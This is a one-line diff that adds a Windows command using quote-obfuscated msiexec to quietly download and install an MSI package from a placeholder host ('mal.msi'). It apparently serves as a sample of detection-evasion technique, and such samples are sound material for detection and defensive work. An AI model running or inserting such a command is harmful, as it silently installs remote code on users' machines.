@@ -1,0 +1,1 @@
+cmd /c ms"ie"xec /q /I "https://mal.msi"
